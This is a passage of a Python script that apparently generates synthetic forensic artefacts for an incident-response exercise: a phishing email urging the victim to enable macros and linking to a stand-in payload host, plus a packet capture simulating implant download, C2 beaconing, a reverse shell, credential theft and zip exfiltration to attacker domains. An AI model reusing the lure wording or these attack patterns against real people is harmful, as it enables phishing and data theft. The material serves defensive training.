        "Please find attached the official quarterly compensation reconciliation statement and executive bonus allocation report (Q3-2026-FINAL) for your division.\r\n\r\n"
        "IMPORTANT INSTRUCTIONS:\r\n"
        "Due to confidential wage protections and digital rights management, this financial document requires Microsoft Office Macro automation to verify your employee digital signature and dynamically calculate your divisional allocations. When prompted by Microsoft Word, please click \"Enable Content\" to allow the audit engine to decrypt and load the live figures.\r\n\r\n"
        "SUMMARY OF ALLOCATIONS:\r\n"
        "- Period: Fiscal Year 2026 - Quarter 3 (Jul 1 - Sep 30)\r\n"
        "- Reference: #INV-2026-994 / BATCH-7721\r\n"
        "- Authorized Recipient: John Doe <jdoe@target.local>\r\n"
        "- Workstation ID: WKSTN-FIN-01.target.local\r\n"
        "- Total Departmental Disbursement: $510,500.00 USD\r\n\r\n"
        "If you have any questions regarding your executive disbursement schedule or direct deposit banking instructions, please contact Corporate Payroll immediately at ext. 4410.\r\n\r\n"
        "Corporate Finance & Executive Disbursements Department\r\n"
        "Global Financial Solutions LLC / Invoicing Services Ltd\r\n"
        "One Liberty Plaza, Suite 3200, New York, NY 10006\r\n"
        "Direct: +1 (212) 555-0199 | internal-portal.target.local\r\n"
        "CONFIDENTIALITY NOTICE: This transmission is intended only for the use of the individual named above and contains confidential proprietary financial information."
    )
    
    body_html = (
        "<!DOCTYPE html><html><head><style>"
        "body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #2d3748; line-height: 1.6; }"
        ".container { max-width: 650px; margin: 0 auto; border: 1px solid #e2e8f0; border-radius: 8px; overflow: hidden; }"
        ".header { background: linear-gradient(135deg, #1a365d 0%, #2b6cb0 100%); color: #ffffff; padding: 24px; text-align: left; }"
        ".header h2 { margin: 0; font-size: 20px; font-weight: 600; }"
        ".header p { margin: 4px 0 0; font-size: 13px; opacity: 0.9; }"
        ".content { padding: 24px; }"
        ".notice-box { background: #fffaf0; border-left: 4px solid #dd6b20; padding: 14px 18px; margin-bottom: 20px; border-radius: 4px; font-size: 13px; color: #7b341e; }"
        ".table-ledger { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 13px; }"
        ".table-ledger th { background: #f7fafc; padding: 10px 12px; border-bottom: 2px solid #edf2f7; text-align: left; color: #4a5568; }"
        ".table-ledger td { padding: 10px 12px; border-bottom: 1px solid #edf2f7; }"
        ".total-row { font-weight: bold; background: #f7fafc; }"
        ".btn { display: inline-block; background: #3182ce; color: #ffffff; text-decoration: none; padding: 10px 20px; border-radius: 5px; font-weight: 600; font-size: 13px; margin: 15px 0; }"
        ".footer { background: #f7fafc; padding: 18px 24px; font-size: 11px; color: #a0aec0; border-top: 1px solid #edf2f7; }"
        "</style></head><body>"
        "<div class=\"container\">"
        "  <div class=\"header\">"
        "    <h2>Global Financial Solutions &amp; Audit Services</h2>"
        "    <p>Executive Disbursements &amp; Payroll Reconciliation System</p>"
        "  </div>"
        "  <div class=\"content\">"
        "    <p>Dear <b>John Doe</b>,</p>"
        "    <p>Your quarterly executive bonus reconciliation statement for Q3 2026 has been generated and is attached to this transmission: <b>" + docm_name + "</b>.</p>"
        "    <div class=\"notice-box\">"
        "      <strong>&#9888; Security Action Required:</strong> To view calculated figures and digital payroll authorization formulas, please click <b>\"Enable Content\"</b> or <b>\"Enable Macros\"</b> in Microsoft Word when prompted."
        "    </div>"
        "    <table class=\"table-ledger\">"
        "      <thead><tr><th>Description</th><th>Allocation Basis</th><th>Amount (USD)</th></tr></thead>"
        "      <tbody>"
        "        <tr><td>Executive Variable Compensation</td><td>Tier 1 Milestone</td><td>$245,000.00</td></tr>"
        "        <tr><td>Divisional Performance Bonus</td><td>Target Met (114%)</td><td>$180,000.00</td></tr>"
        "        <tr><td>Discretionary Management Pool</td><td>Board Approved</td><td>$85,500.00</td></tr>"
        "        <tr class=\"total-row\"><td>Total Q3 Gross Disbursement</td><td></td><td>$510,500.00</td></tr>"
        "      </tbody>"
        "    </table>"
        "    <p>You can also verify your disbursement status on the corporate staging mirror:</p>"
        "    <p><a class=\"btn\" href=\"http://evil-payloads-delivery.org/beacon_updater.exe\">Access Payroll Staging Mirror</a></p>"
        "  </div>"
        "  <div class=\"footer\">"
        "    &copy; 2026 Global Financial Solutions LLC. One Liberty Plaza, New York, NY 10006.<br>"
        "    Confidential and proprietary. Forwarding or copying prohibited without prior written consent."
        "  </div>"
        "</div></body></html>"
    )

    transport_headers = (
        "Received: from mail-mbx02.target.local (10.0.1.12) by mail.target.local (10.0.1.10) with Microsoft SMTP Server id 15.2.1118.7; Sat, 10 Oct 2026 09:59:04 +0000\r\n"
        "Received: from exchange-hub01.target.local (10.0.1.10) by mail-mbx02.target.local (10.0.1.12) with Microsoft SMTP Server id 15.2.1118.7; Sat, 10 Oct 2026 09:59:03 +0000\r\n"
        "Received: from proofpoint-mx1.target.local (10.0.1.25) by exchange-hub01.target.local (10.0.1.10) with ESMTP id 84729112; Sat, 10 Oct 2026 09:59:02 +0000\r\n"
        "Received: from mail.evil-payloads-delivery.org (185.220.101.45) by proofpoint-mx1.target.local (10.0.1.25) with ESMTP id p9871623; Sat, 10 Oct 2026 09:59:01 +0000\r\n"
        "Authentication-Results: mx.target.local;\r\n"
        "    dkim=pass header.i=@evil-payloads-delivery.org header.s=default header.b=X9b2Fq1z;\r\n"
        "    spf=pass (target.local: domain of billing@evil-payloads-delivery.org designates 185.220.101.45 as permitted sender) smtp.mailfrom=billing@evil-payloads-delivery.org;\r\n"
        "    dmarc=pass (p=NONE sp=NONE pct=100) action=none header.from=evil-payloads-delivery.org;\r\n"
        "From: \"Finance Billing & Payroll\" <billing@evil-payloads-delivery.org>\r\n"
        "To: \"John Doe\" <jdoe@target.local>\r\n"
        f"Subject: {subject}\r\n"
        "Date: Sat, 10 Oct 2026 09:59:00 +0000\r\n"
        "Message-ID: <20261010095900.771234@evil-payloads-delivery.org>\r\n"
        "MIME-Version: 1.0\r\n"
        "Content-Type: multipart/mixed; boundary=\"----=_Part_991823_102837192.1760089140\"\r\n"
        "X-Mailer: Microsoft Outlook 16.0\r\n"
        "X-Originating-IP: [185.220.101.45]\r\n"
    )

    mini_streams = [
        ("__substg1.0_0037001F", subject.encode("utf-16le")),
        ("__substg1.0_0C1A001F", from_addr.encode("utf-16le")),
        ("__substg1.0_0E04001F", to_addr.encode("utf-16le")),
        ("__substg1.0_1000001F", body_text.encode("utf-16le")),
        ("__substg1.0_10130102", body_html.encode("utf-8")),
        ("__substg1.0_007D001F", transport_headers.encode("utf-16le")),
        ("__substg1.0_3707001F", docm_name.encode("utf-16le")),
    ]
    fat_streams = [
        ("__substg1.0_37010102", docm_bytes)
    ]

    ministream_data = bytearray()
    minifat = []
    mini_info = []
    for name, data in mini_streams:
        start_minisec = len(ministream_data) // 64
        num_minisecs = (len(data) + 63) // 64
        ministream_data.extend(data)
        ministream_data.extend(b"\x00" * ((64 - (len(data) % 64)) % 64))
        for i in range(num_minisecs - 1):
            minifat.append(start_minisec + i + 1)
        minifat.append(0xFFFFFFFE)
        mini_info.append((name, len(data), start_minisec))

    mini_pad = (512 - (len(ministream_data) % 512)) % 512
    ministream_data.extend(b"\x00" * mini_pad)

    minifat_pad = (128 - (len(minifat) % 128)) % 128
    minifat.extend([0xFFFFFFFF] * minifat_pad)
    minifat_bytes = struct.pack(f"<{len(minifat)}I", *minifat)
    num_minifat_secs = len(minifat_bytes) // 512
    num_ministream_secs = len(ministream_data) // 512

    all_items = [(m[0], m[1], m[2]) for m in mini_info]
    curr_data_sec = 1 + num_minifat_secs + num_ministream_secs
    fat_info = []
    for name, data in fat_streams:
        num_secs = (len(data) + 511) // 512
        fat_info.append((name, len(data), curr_data_sec, num_secs, data))
        all_items.append((name, len(data), curr_data_sec))
        curr_data_sec += num_secs

    num_entries = 1 + len(all_items)
    num_dir_secs = (num_entries * 128 + 511) // 512
    sec_dir = 0
    sec_minifat = num_dir_secs
    sec_ministream = sec_minifat + num_minifat_secs

    fat_info_adj = []
    all_items_adj = []
    for name, sz, msec in mini_info:
        all_items_adj.append((name, sz, msec))
    curr_data_sec = sec_ministream + num_ministream_secs
    for name, sz, _, num_secs, data in fat_info:
        fat_info_adj.append((name, sz, curr_data_sec, num_secs, data))
        all_items_adj.append((name, sz, curr_data_sec))
        curr_data_sec += num_secs

    sec_fat_start = curr_data_sec
    num_fat_secs = 1
    while (sec_fat_start + num_fat_secs + 127) // 128 > num_fat_secs:
        num_fat_secs += 1
    total_secs = sec_fat_start + num_fat_secs

    fat = [0xFFFFFFFF] * (num_fat_secs * 128)
    for i in range(num_dir_secs - 1):
        fat[sec_dir + i] = sec_dir + i + 1
    fat[sec_dir + num_dir_secs - 1] = 0xFFFFFFFE

    for i in range(num_minifat_secs - 1):
        fat[sec_minifat + i] = sec_minifat + i + 1
    fat[sec_minifat + num_minifat_secs - 1] = 0xFFFFFFFE

    for i in range(num_ministream_secs - 1):
        fat[sec_ministream + i] = sec_ministream + i + 1
    fat[sec_ministream + num_ministream_secs - 1] = 0xFFFFFFFE

    for name, sz, s_start, num_secs, data in fat_info_adj:
        for i in range(num_secs - 1):
            fat[s_start + i] = s_start + i + 1
        fat[s_start + num_secs - 1] = 0xFFFFFFFE

    for i in range(num_fat_secs):
        fat[sec_fat_start + i] = 0xFFFFFFFD

    fat_bytes = struct.pack(f"<{len(fat)}I", *fat)

    def make_direntry(name, entry_type, size, isect_start, child_id=0xFFFFFFFF, left_id=0xFFFFFFFF, right_id=0xFFFFFFFF):
        u_name = name.encode("utf-16le")
        namelength = len(u_name) + 2
        raw_name = u_name + b"\x00" * (64 - len(u_name))
        return struct.pack(
            "<64sHBBIII16sIQQIII",
            raw_name,
            namelength,
            entry_type,
            1,
            left_id,
            right_id,
            child_id,
            b"\x00" * 16,
            0,
            0,
            0,
            isect_start,
            size & 0xFFFFFFFF,
            (size >> 32) & 0xFFFFFFFF
        )

    dir_raw = bytearray()
    root_entry = make_direntry("Root Entry", 5, len(ministream_data), sec_ministream, child_id=1 if all_items_adj else 0xFFFFFFFF)
    dir_raw.extend(root_entry)

    for idx, (name, sz, isect) in enumerate(all_items_adj):
        right = (idx + 2) if (idx + 1 < len(all_items_adj)) else 0xFFFFFFFF
        dir_raw.extend(make_direntry(name, 2, sz, isect, right_id=right))

    dir_raw.extend(b"\x00" * (num_dir_secs * 512 - len(dir_raw)))

    hdr = bytearray(512)
    hdr[0:8] = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"
    hdr[28:30] = struct.pack("<H", 0xFFFE)
    hdr[30:32] = struct.pack("<H", 9)
    hdr[32:34] = struct.pack("<H", 6)
    hdr[44:48] = struct.pack("<I", num_fat_secs)
    hdr[48:52] = struct.pack("<I", sec_dir)
    hdr[56:60] = struct.pack("<I", 4096)
    hdr[60:64] = struct.pack("<I", sec_minifat)
    hdr[64:68] = struct.pack("<I", num_minifat_secs)
    hdr[68:72] = struct.pack("<I", 0xFFFFFFFE)
    hdr[72:76] = struct.pack("<I", 0)
    for i in range(num_fat_secs):
        hdr[76 + i*4 : 80 + i*4] = struct.pack("<I", sec_fat_start + i)
    for i in range(num_fat_secs, 109):
        hdr[76 + i*4 : 80 + i*4] = struct.pack("<I", 0xFFFFFFFF)

    buf = bytearray()
    buf.extend(hdr)
    buf.extend(dir_raw)
    buf.extend(minifat_bytes)
    buf.extend(ministream_data)
    for name, sz, s_start, num_secs, data in fat_info_adj:
        buf.extend(data)
        buf.extend(b"\x00" * ((512 - (len(data) % 512)) % 512))
    buf.extend(fat_bytes)
    return bytes(buf)

MSG_BYTES = generate_phishing_msg(DOCM_BYTES, "02_weaponized_document.docm")

print(f"[*] Generated Staged Binary: beacon_updater.exe ({len(PE_BYTES)} bytes)")
print(f"    SHA-256: {PE_SHA256}")
print(f"    MD5:     {PE_MD5}")
print(f"[*] Generated Exfil Archive: financial_q3_confidential.zip ({len(ZIP_BYTES)} bytes)")
print(f"    SHA-256: {ZIP_SHA256}")
print(f"    MD5:     {ZIP_MD5}")
print(f"[*] Generated Weaponized Doc: 02_weaponized_document.docm ({len(DOCM_BYTES)} bytes)")
print(f"    SHA-256: {DOCM_SHA256}")
print(f"    MD5:     {DOCM_MD5}")
print(f"[*] Generated Phishing Email: 01_phishing_email.msg ({len(MSG_BYTES)} bytes)")

# -------------------------------------------------------------------------
# 5. PCAP Construction Helpers
# -------------------------------------------------------------------------
def ip_to_bytes(ip_str: str) -> bytes:
    return socket.inet_aton(ip_str)

def checksum(data: bytes) -> int:
    if len(data) % 2 == 1:
        data += b"\x00"
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

def make_arp_packet(src_mac: bytes, dst_mac: bytes, op: int, sender_mac: bytes, sender_ip: str, target_mac: bytes, target_ip: str) -> bytes:
    """Builds a standard 60-byte Ethernet ARP frame (Op 1 = Request, Op 2 = Reply)."""
    eth_hdr = dst_mac + src_mac + b"\x08\x06"
    arp_body = struct.pack(
        "!HHBBH6s4s6s4s",
        1,               # Hardware type: Ethernet (1)
        0x0800,          # Protocol type: IPv4 (0x0800)
        6,               # Hardware size: 6
        4,               # Protocol size: 4
        op,              # Opcode: 1 (Request) or 2 (Reply)
        sender_mac,
        ip_to_bytes(sender_ip),
        target_mac,
        ip_to_bytes(target_ip)
    )
    padding = b"\x00" * (46 - len(arp_body))
    return eth_hdr + arp_body + padding

def make_eth_ip_tcp(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq, ack, flags, payload):
    eth_hdr = dst_mac + src_mac + b"\x08\x00"
    total_len = 20 + 20 + len(payload)
    ip_hdr_no_cksum = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, total_len, 2468, 0x4000, 64, 6, 0,
        ip_to_bytes(src_ip), ip_to_bytes(dst_ip)
    )
    ip_cksum = checksum(ip_hdr_no_cksum)
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, total_len, 2468, 0x4000, 64, 6, ip_cksum,
        ip_to_bytes(src_ip), ip_to_bytes(dst_ip)
    )
    tcp_hdr_no_cksum = struct.pack("!HHIIBBHHH",
        src_port, dst_port, seq, ack, (5 << 4), flags, 8192, 0, 0
    )
    pseudo_hdr = struct.pack("!4s4sBBH",
        ip_to_bytes(src_ip), ip_to_bytes(dst_ip), 0, 6, 20 + len(payload)
    )
    tcp_cksum = checksum(pseudo_hdr + tcp_hdr_no_cksum + payload)
    tcp_hdr = struct.pack("!HHIIBBHHH",
        src_port, dst_port, seq, ack, (5 << 4), flags, 8192, tcp_cksum, 0
    )
    return eth_hdr + ip_hdr + tcp_hdr + payload

def make_eth_ip_udp(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, payload):
    eth_hdr = dst_mac + src_mac + b"\x08\x00"
    udp_len = 8 + len(payload)
    ip_total_len = 20 + udp_len
    ip_hdr_no_cksum = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, ip_total_len, 5432, 0x4000, 64, 17, 0,
        ip_to_bytes(src_ip), ip_to_bytes(dst_ip)
    )
    ip_cksum = checksum(ip_hdr_no_cksum)
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, ip_total_len, 5432, 0x4000, 64, 17, ip_cksum,
        ip_to_bytes(src_ip), ip_to_bytes(dst_ip)
    )
    udp_hdr = struct.pack("!HHHH", src_port, dst_port, udp_len, 0)
    return eth_hdr + ip_hdr + udp_hdr + payload

def make_eth_ip_udp_dns(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, domain, resolved_ip=None, is_response=False, txid=0x4A21):
    if not is_response:
        dns_flags = 0x0100
        qdcount, ancount, nscount, arcount = 1, 0, 0, 0
        qname_parts = domain.split(".")
        qname_bytes = b"".join(bytes([len(p)]) + p.encode("ascii") for p in qname_parts) + b"\x00"
        qtype_qclass = struct.pack("!HH", 1, 1)
        dns_body = struct.pack("!HHHHHH", txid, dns_flags, qdcount, ancount, nscount, arcount) + qname_bytes + qtype_qclass
    else:
        dns_flags = 0x8180
        qdcount, ancount, nscount, arcount = 1, 1, 0, 0
        qname_parts = domain.split(".")
        qname_bytes = b"".join(bytes([len(p)]) + p.encode("ascii") for p in qname_parts) + b"\x00"
        qtype_qclass = struct.pack("!HH", 1, 1)
        answer_ptr = struct.pack("!HHIH4s", 0xC00C, 1, 300, 4, ip_to_bytes(resolved_ip or "1.1.1.1"))
        dns_body = struct.pack("!HHHHHH", txid, dns_flags, qdcount, ancount, nscount, arcount) + qname_bytes + qtype_qclass + answer_ptr

    return make_eth_ip_udp(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, dns_body)

# -------------------------------------------------------------------------
# 6. Build Hacker Attack PCAP File: 06_network_traffic_capture.pcap
# -------------------------------------------------------------------------
def build_pcap(pe_bytes: bytes, zip_bytes: bytes):
    out_pcap = os.path.join(OUT_DIR, "06_network_traffic_capture.pcap")
    pcap_hdr = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
    packets = []

    mac_host_a = b"\x00\x50\x56\xAA\x11\x22"  # Host A WKSTN-FIN-01
    mac_router = b"\x00\x50\x56\xEE\x99\x88"  # Internal Gateway / Switch
    mac_dc = b"\x00\x50\x56\xBB\x33\x44"      # Host B DC-PROD-01
    mac_bcast = b"\xFF\xFF\xFF\xFF\xFF\xFF"

    ip_host_a = "10.0.4.15"
    ip_gw = "10.0.4.1"
    ip_dc = "10.0.4.50"
    ip_c2 = "185.220.101.45"
    ip_shell = "194.26.29.112"
    ip_exfil = "91.240.118.72"
    domain_c2 = "evil-payloads-delivery.org"
    domain_exfil = "dropzone-secure-exfil.com"

    morning_ts = 1760088600.0  # 09:30:00Z
    attack_ts = 1760090400.0   # 10:00:00Z

    # PART A: Routine Enterprise Background Telemetry (09:30:00 - 09:55:00)
    packets.append((morning_ts + 1.0, make_arp_packet(mac_host_a, mac_bcast, 1, mac_host_a, ip_host_a, b"\x00"*6, ip_gw)))
    packets.append((morning_ts + 1.05, make_arp_packet(mac_router, mac_host_a, 2, mac_router, ip_gw, mac_host_a, ip_host_a)))

    packets.append((morning_ts + 2.0, make_arp_packet(mac_host_a, mac_bcast, 1, mac_host_a, ip_host_a, b"\x00"*6, ip_dc)))
    packets.append((morning_ts + 2.05, make_arp_packet(mac_dc, mac_host_a, 2, mac_dc, ip_dc, mac_host_a, ip_host_a)))

    benign_domains = [
        ("login.microsoftonline.com", "20.190.159.0", 53101, 10.0),
        ("teams.microsoft.com", "52.113.194.132", 53102, 25.0),
        ("connectivitycheck.gstatic.com", "142.250.190.35", 53103, 40.0),
        ("internal-portal.target.local", ip_dc, 53104, 60.0),
    ]
    for d_name, d_ip, s_port, offset in benign_domains:
        packets.append((morning_ts + offset, make_eth_ip_udp_dns(mac_host_a, mac_dc, ip_host_a, ip_dc, s_port, 53, d_name, is_response=False, txid=s_port)))
        packets.append((morning_ts + offset + 0.05, make_eth_ip_udp_dns(mac_dc, mac_host_a, ip_dc, ip_host_a, 53, s_port, d_name, resolved_ip=d_ip, is_response=True, txid=s_port)))

    # Internal Finance Portal Browsing (09:32:00)
    portal_req = (
        b"GET /portal/home.html HTTP/1.1\r\n"
        b"Host: internal-portal.target.local\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0\r\n"
        b"Accept: text/html,application/xhtml+xml\r\n\r\n"
    )
    packets.append((morning_ts + 120.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 49720, 80, 100, 0, 0x18, portal_req)))

    portal_resp = (
        b"HTTP/1.1 200 OK\r\n"
        b"Server: Microsoft-IIS/10.0\r\n"
        b"Content-Type: text/html; charset=utf-8\r\n"
        b"Content-Length: 142\r\n\r\n"
        b"<html><head><title>Finance Portal - TARGET CORP</title></head><body><h1>Welcome John Doe (Finance)</h1><p>Authorized access only.</p></body></html>"
    )
    packets.append((morning_ts + 120.1, make_eth_ip_tcp(mac_dc, mac_host_a, ip_dc, ip_host_a, 80, 49720, 200, 100 + len(portal_req), 0x18, portal_resp)))

    # TLS Session to Microsoft Online (09:35:00)
    sni_msft = b"login.microsoftonline.com"
    tls_sni_msft = b"\x00\x00" + struct.pack("!H", len(sni_msft) + 5) + struct.pack("!H", len(sni_msft) + 3) + b"\x00" + struct.pack("!H", len(sni_msft)) + sni_msft
    tls_hs_msft = b"\x01\x00\x00\x70\x03\x03" + (b"\x22" * 32) + b"\x00\x00\x04\x13\x01\x13\x02\x01\x00\x00\x30" + tls_sni_msft
    tls_rec_msft = b"\x16\x03\x01" + struct.pack("!H", len(tls_hs_msft)) + tls_hs_msft
    packets.append((morning_ts + 300.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, "20.190.159.0", 49755, 443, 500, 0, 0x18, tls_rec_msft)))

    # PART B: Attack Scenario Phase (10:00:00 - 10:01:30)
    # Step 1: Reconnaissance Search (t + 1s)
    q_search = b"GET /search?q=powershell+downloadstring+cradle+amsi+bypass+mimikatz HTTP/1.1\r\nHost: www.google.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    packets.append((attack_ts + 1.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, "142.250.190.46", 49788, 80, 1000, 0, 0x18, q_search)))
    resp_search = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 45\r\n\r\n<html><body>Search Results Returned</body></html>"
    packets.append((attack_ts + 1.2, make_eth_ip_tcp(mac_router, mac_host_a, "142.250.190.46", ip_host_a, 80, 49788, 2000, 1000 + len(q_search), 0x18, resp_search)))

    # Step 2: DNS Query for C2 Domain (t + 5s)
    packets.append((attack_ts + 5.0, make_eth_ip_udp_dns(mac_host_a, mac_dc, ip_host_a, ip_dc, 53210, 53, domain_c2, is_response=False, txid=0x1337)))
    packets.append((attack_ts + 5.05, make_eth_ip_udp_dns(mac_dc, mac_host_a, ip_dc, ip_host_a, 53, 53210, domain_c2, resolved_ip=ip_c2, is_response=True, txid=0x1337)))

    # Step 3: HTTP GET Staged Implant Payload: /beacon_updater.exe (t + 6s)
    s3_req = (
        f"GET /beacon_updater.exe HTTP/1.1\r\n"
        f"Host: {domain_c2}\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; PowerShell 5.1)\r\n"
        f"Accept: */*\r\n\r\n"
    ).encode("ascii")
    packets.append((attack_ts + 6.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49810, 80, 3000, 0, 0x18, s3_req)))

    s3_resp = (
        f"HTTP/1.1 200 OK\r\n"
        f"Server: nginx/1.22.0\r\n"
        f"Content-Type: application/x-msdownload\r\n"
        f"Content-Disposition: attachment; filename=\"beacon_updater.exe\"\r\n"
        f"Content-Length: {len(pe_bytes)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode("ascii") + pe_bytes
    packets.append((attack_ts + 6.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_c2, ip_host_a, 80, 49810, 4000, 3000 + len(s3_req), 0x18, s3_resp)))

    # Step 4: TLS C2 Encrypted Beaconing (t + 12s, 17s, 22s)
    sni_c2 = b"c2.evil-payloads-delivery.org"
    tls_sni_ext = b"\x00\x00" + struct.pack("!H", len(sni_c2) + 5) + struct.pack("!H", len(sni_c2) + 3) + b"\x00" + struct.pack("!H", len(sni_c2)) + sni_c2
    tls_hello = b"\x01\x00\x00\x80\x03\x03" + (b"\x11" * 32) + b"\x00\x00\x04\x13\x01\x13\x02\x01\x00\x00\x40" + tls_sni_ext
    tls_record = b"\x16\x03\x01" + struct.pack("!H", len(tls_hello)) + tls_hello
    packets.append((attack_ts + 12.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49812, 443, 5000, 0, 0x18, tls_record)))
    
    tls_app_data = b"\x17\x03\x03\x00\x40" + (b"\x5A" * 64)
    packets.append((attack_ts + 17.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49812, 443, 5000 + len(tls_record), 100, 0x18, tls_app_data)))
    packets.append((attack_ts + 22.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49812, 443, 5000 + len(tls_record) + len(tls_app_data), 200, 0x18, tls_app_data)))

    # Step 5: Reverse TCP Shell on 194.26.29.112:4444 (t + 25s)
    shell_syn = b""
    packets.append((attack_ts + 25.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49815, 4444, 7000, 0, 0x02, shell_syn)))
    packets.append((attack_ts + 25.1, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49815, 8000, 7001, 0x12, shell_syn)))
    
    shell_banner = b"Microsoft Windows [Version 10.0.19045.3803]\r\n(c) Microsoft Corporation. All rights reserved.\r\n\r\nC:\\Users\\jdoe> whoami\r\nTARGET\\jdoe\r\n\r\nC:\\Users\\jdoe> "
    packets.append((attack_ts + 25.3, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49815, 4444, 7001, 8001, 0x18, shell_banner)))

    # Step 6: Harvested Credentials Exfiltration in Cleartext HTTP POST (t + 30s)
    s6_post = (
        f"POST /api/v1/harvested_creds HTTP/1.1\r\n"
        f"Host: {domain_c2}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 68\r\n\r\n"
        f"username=TARGET%5Csvg_admin&password=P%40ssw0rd2026%21Summer%23&host=WKSTN-FIN-01"
    ).encode("ascii")
    packets.append((attack_ts + 30.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49820, 80, 9000, 0, 0x18, s6_post)))

    # Step 7: SMB2 Lateral Movement Connection to DC-PROD-01 (t + 38s)
    smb_neg_req = b"\x00\x00\x00\x44\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    packets.append((attack_ts + 38.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 49825, 445, 11000, 0, 0x18, smb_neg_req)))
    smb_neg_resp = b"\x00\x00\x00\x44\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    packets.append((attack_ts + 38.1, make_eth_ip_tcp(mac_dc, mac_host_a, ip_dc, ip_host_a, 445, 49825, 12000, 11000 + len(smb_neg_req), 0x18, smb_neg_resp)))

    # Step 8: DNS Query for Exfiltration Dropzone Domain (t + 55s)
    packets.append((attack_ts + 55.0, make_eth_ip_udp_dns(mac_host_a, mac_dc, ip_host_a, ip_dc, 53215, 53, domain_exfil, is_response=False, txid=0x99AA)))
    packets.append((attack_ts + 55.05, make_eth_ip_udp_dns(mac_dc, mac_host_a, ip_dc, ip_host_a, 53, 53215, domain_exfil, resolved_ip=ip_exfil, is_response=True, txid=0x99AA)))

    # Step 9: HTTP POST Exfiltrate Compressed Archive: financial_q3_confidential.zip (t + 57s)
    s9_post_req = (
        f"POST /upload/financial_q3_confidential.zip HTTP/1.1\r\n"
        f"Host: {domain_exfil}\r\n"
        f"Content-Type: application/zip\r\n"
        f"Content-Disposition: attachment; filename=\"financial_q3_confidential.zip\"\r\n"
        f"Content-Length: {len(zip_bytes)}\r\n\r\n"
    ).encode("ascii") + zip_bytes
    packets.append((attack_ts + 57.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_exfil, 49830, 80, 16000, 0, 0x18, s9_post_req)))

    s9_post_resp = (
        "HTTP/1.1 200 OK\r\n"
        "Server: Apache/2.4.52\r\n"
        "Content-Type: application/zip\r\n"
        "Content-Disposition: attachment; filename=\"financial_q3_confidential.zip\"\r\n"
        f"Content-Length: {len(zip_bytes)}\r\n\r\n"
    ).encode("ascii") + zip_bytes
    packets.append((attack_ts + 58.0, make_eth_ip_tcp(mac_router, mac_host_a, ip_exfil, ip_host_a, 80, 49830, 17000, 16000 + len(s9_post_req), 0x18, s9_post_resp)))

    packets.sort(key=lambda p: p[0])

    pcap_bytes = io.BytesIO()
    pcap_bytes.write(pcap_hdr)
    for ts, pkt in packets:
        ts_sec = int(ts)
        ts_usec = int((ts - ts_sec) * 1e6)
        pcap_bytes.write(struct.pack("<IIII", ts_sec, ts_usec, len(pkt), len(pkt)) + pkt)

    raw_pcap = pcap_bytes.getvalue()
    with open(out_pcap, "wb") as f:
        f.write(raw_pcap)

    print(f"[+] Successfully wrote PCAP: {out_pcap} ({len(packets)} packets)")

# -------------------------------------------------------------------------
# 7. Build Windows Event Log File: 04_endpoint_workstation_hostA.evtx
# -------------------------------------------------------------------------
def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: str, zip_sha256: str, zip_md5: str):
    out_file = os.path.join(OUT_DIR, "04_endpoint_workstation_hostA.evtx")

    xml_content = rf"""<Events>
  <!-- ===================================================================== -->
  <!-- SECTION A: Normal Enterprise Startup, System Services & User Telemetry -->
  <!-- ===================================================================== -->

  <!-- 1. System Boot: Event Log Service Started (6005) at 08:15:20Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="EventLog" />
      <EventID>6005</EventID>
      <TimeCreated SystemTime="2026-10-10T08:15:20.000Z" />
